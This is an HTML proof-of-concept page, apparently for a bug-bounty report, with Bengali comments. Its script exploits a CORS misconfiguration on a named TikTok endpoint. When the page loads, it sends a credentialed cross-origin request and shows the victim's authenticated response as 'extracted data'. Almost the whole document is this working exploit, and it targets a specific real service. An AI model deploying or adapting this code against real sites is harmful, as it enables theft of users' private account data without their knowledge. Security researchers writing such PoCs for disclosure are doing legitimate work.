<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CORS Exploit PoC - pagolmoon3</title>
</head>
<body>
    <h2>CORS Misconfiguration Proof of Concept</h2>
    <p>Status: <span id="status">Testing...</span></p>
    <pre id="output"></pre>

    <script>
        // যে এন্ডপয়েন্টটি আপনি বার্পস্যুটে টেস্ট করেছেন
        const targetUrl = "https://mcs.us.tiktok.com/json/"; 

        function exploit() {
            const output = document.getElementById("output");
            const status = document.getElementById("status");
            
            var req = new XMLHttpRequest();
            
            req.open("GET", targetUrl, true);
            
            // Credential true থাকার কারণেই আমরা ইউজারের কুকি রিড করতে পারছি
            req.withCredentials = true; 
            
            req.onload = function() {
                if (req.status === 200) {
                    status.innerText = "Success! Data Extracted:";
                    output.innerText = this.responseText;
                    console.log("Extracted Data:", this.responseText);
                    alert("Data Extracted Successfully!");
                } else {
                    status.innerText = "Failed with status: " + req.status;
                    output.innerText = this.responseText;
                }
            };
            
            req.onerror = function() {
                status.innerText = "Request failed! CORS policy might be blocking.";
            };
            
            req.send();
        }

        // পেজ লোড হওয়ার পর স্বয়ংক্রিয়ভাবে এক্সপ্লয়েট রান করবে
        window.onload = exploit;
    </script>
</body>
</html>
